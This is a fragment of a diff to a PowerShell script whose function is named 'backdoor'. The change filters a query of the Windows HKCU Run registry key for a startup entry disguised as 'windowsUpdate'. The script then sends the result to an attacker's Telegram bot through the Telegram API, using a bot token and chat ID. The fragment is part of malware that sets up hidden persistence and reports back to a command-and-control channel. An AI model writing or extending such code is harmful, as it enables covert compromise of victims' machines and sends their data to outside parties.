@@ -39,7 +39,7 @@ function backdoor {
 
         # Check backdoor
         #$checkBackdoor = Get-CimInstance Win32_StartupCommand | Select-String windowsUpdate
-        $checkBackdoor = reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+        $checkBackdoor = reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run | Select-String windowsUpdate
         Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($checkBackdoor)"
 		
         # Backdoor on startup programs
